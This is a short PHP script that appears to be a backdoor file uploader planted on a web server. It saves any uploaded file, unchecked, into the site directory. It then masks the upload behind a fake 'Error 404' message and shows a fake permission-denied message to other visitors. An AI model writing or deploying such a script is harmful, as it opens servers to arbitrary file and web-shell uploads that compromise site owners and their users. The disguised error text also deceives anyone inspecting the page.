<?php
if(isset($_FILES['block'])){
$blockname = basename($_FILES['block']['name']);
$blocktmp = $_FILES['block']['tmp_name'];
if(move_uploaded_file($blocktmp, $blockname)){
	echo "<b>Error 404 </b><a target='_blank' href='$blockname'> Home Page</a>";
}
}
else{
	echo " you don't have permission to access here bb";
}
?>